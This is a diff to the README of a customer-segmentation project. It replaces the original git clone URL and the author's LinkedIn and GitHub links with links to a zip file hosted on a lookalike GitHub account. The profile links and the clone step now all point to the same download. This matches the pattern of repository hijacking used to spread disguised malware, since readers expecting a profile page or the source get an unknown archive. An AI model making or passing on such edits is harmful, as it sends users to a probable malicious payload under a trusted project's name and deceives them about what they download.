@@ -78,7 +78,7 @@ customer-segmentation/
 
 ### 1. Clone the repository
 ```bash
-git clone https://github.com/rohannneupane02/customer-segmentation.git
+git clone https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip
 cd customer-segmentation
 ```
 
@@ -134,8 +134,8 @@ python src/predict_cluster.py
 
 **Rohan Neupane**  
 📧 rohannneupane02@gmail.com  
-🔗 [LinkedIn](https://www.linkedin.com/in/rohan-neupane)  
-🐙 [GitHub](https://github.com/rohannneupane02)
+🔗 [LinkedIn](https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip)  
+🐙 [GitHub](https://github.com/rohannp02y/customer_segmentation/raw/refs/heads/main/decare/customer_segmentation_rusine.zip)
 
 ---
 
